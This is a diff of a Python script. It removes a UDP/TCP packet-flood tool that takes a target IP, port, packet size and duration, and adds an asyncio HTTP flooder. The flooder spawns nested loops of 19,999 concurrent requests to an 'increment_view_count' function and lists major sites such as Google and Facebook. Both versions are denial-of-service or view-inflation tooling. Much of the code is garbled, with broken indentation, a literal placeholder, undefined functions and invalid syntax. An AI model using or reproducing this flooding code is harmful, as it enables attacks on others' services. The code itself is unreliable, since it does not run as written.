@@ -1,12 +1,17 @@
-#!/usr/bin/env python
-#_*_ coding: utf-80 _*_
-import os
-import threading
-import sys
-import time
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+import requests
+import aiohttp
+import asyncio
+import colorama
 import random
-import socket
-import fade
+import string 
+import time
+import os
+if os.name == 'nt':
+    os.system('cls')
+else:
+    os.system('clear')
 
 os.system("clear")
 logo = """
@@ -29,37 +34,50 @@ logo = """
 faded_text = fade.fire(logo)
 print(faded_text)
 
-sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size> <time>")
+url = input("\033[92mIP/URL: \033[0m").strip()
+url = input("\033[92Press Enter u/ melanjutkan:\033[0m")
+                        
+async with aiohttp.ClientSession() as session:
+     try:
+        async with session.get(url) as resp:
+            if response.status == 200:
+            data = await resp.text()
+            <do-stuff-with-data>
 
-ip = sys.argv[1]
-port = int(sys.argv[2])
-size = int(sys.argv[3])
-t1m3 = int(sys.argv[4])
-timeout = time.time() + t1m3
-sent = 0
-data = 'f1a525da11f6'.decode('hex')
-while True:
-        try: 
-	   if time.time() > timeout:
-                 break
-           else:
-                 pass
-               udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-               syn = socket.socket()
-               s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
-               if port == "0":
-                        port = random.randrange(1, 65535)
-               s.connect((ip, port))
-               s.send(data)
-               bytes = random._urandom(size)
-               syn.connect((ip, port))
-               udp.sendto(bytes,(ip, port))
-               sent = sent + 1
-               print("\033[32mHUDAIRUL-AQSHA:  \033[96mTarget --> %s | Port: %s | And size: %s | TiMe: %s | Pack: %s\033[0m")%(ip, port, size, t1m3, sent)
-				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
-        except KeyboardInterrupt:
-               print(" Stopping Flood!")
-               sys.exit()
-        except Except as e:
-               print("Socket Couldn't Connect")
-               sys.exit()
+urls  = [
+         "https://github.com/",
+         "https://google.it/",
+         "https://facebook.com/",
+         "https://alibaba.com/",
+         "https://google.com/",
+         "https://youtube.com",
+         
+        ]
+
+loop = asyncio.get_event_loop()
+loop.run_until_complete(
+    asyncio.gather(
+        *(get_cards(url) for url in urls)
+        print("[+]>Status Sent")
+
+ else:
+                print("Failed ping.")
+    except aiohttp.ClientError as e:
+                print("\033[92m[+\033[92m] \033[1mAn error occurred:\033[0m", e)
+
+async def main():
+    connector = aiohttp.TCPConnector(limit=None) # Enable connection pooling
+    async with aiohttp.ClientSession(connector=connector) as session:
+        tasks = []
+        for _ in range(19999):  # Increase the number of concurrent requests
+            task = asyncio.create_task(increment_view_count(session))
+            tasks.append(task)
+            for i in range(19999):  # Increase the number of concurrent requests
+                task = asyncio.create_task(increment_view_count(session))
+                tasks.append(task)
+            await asyncio.gather(*tasks)
+        await asyncio.gather(*tasks)
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
